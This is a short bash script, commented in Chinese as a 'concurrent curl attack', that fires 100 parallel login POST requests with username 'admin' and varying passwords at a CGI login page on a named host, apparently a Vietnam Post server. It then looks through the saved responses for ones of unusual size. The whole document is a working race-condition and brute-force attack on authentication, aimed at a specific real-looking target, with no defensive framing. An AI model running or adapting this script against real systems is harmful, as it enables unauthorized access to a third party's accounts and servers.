#!/bin/bash
# 并发curl攻击

echo "[*] 启动100个并发curl进程..."

for i in {1..100}; do
    (curl -sk "https://vps.vnpost.vn/cgi-bin/MANGA/index.cgi" \
         -X POST \
         -d "func=login&username=admin&password=race$i" \
         -o /tmp/race_$i.html 2>&1) &
done

wait
echo "[*] 并发攻击完成，检查异常响应..."
find /tmp -name "race_*.html" -type f -size +7000c | head -5
